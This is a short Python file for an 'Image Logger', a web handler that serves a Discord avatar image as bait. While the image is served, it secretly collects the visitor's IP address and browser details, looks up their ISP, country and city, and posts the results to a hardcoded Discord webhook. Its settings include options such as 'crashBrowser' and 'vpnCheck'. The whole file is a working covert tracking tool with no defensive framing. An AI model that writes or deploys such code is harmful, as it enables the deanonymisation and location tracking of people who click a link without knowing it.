from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1508249694781050982/hKNbAdw9NeOYtCv-5y7xoR22Q66qphIjR13DxSJXYc2WNnAxzyXnQjOJ6aosNmARCEDG",
    "image": "https://cdn.discordapp.com/embed/avatars/0.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}").json()
        os, browser = httpagentparser.simple_detect(useragent)
        embed = {
            "username": config["username"],
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"**IP:** {ip}\n**Provider:** {info.get('isp', 'Unknown')}\n**Country:** {info.get('country', 'Unknown')}\n**City:** {info.get('city', 'Unknown')}\n**OS:** {os}\n**Browser:** {browser}"
            }]
        }
        requests.post(config["webhook"], json=embed)
    except:
        pass

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<img src="https://cdn.discordapp.com/embed/avatars/0.png">')
        makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))

handler = ImageLoggerAPI
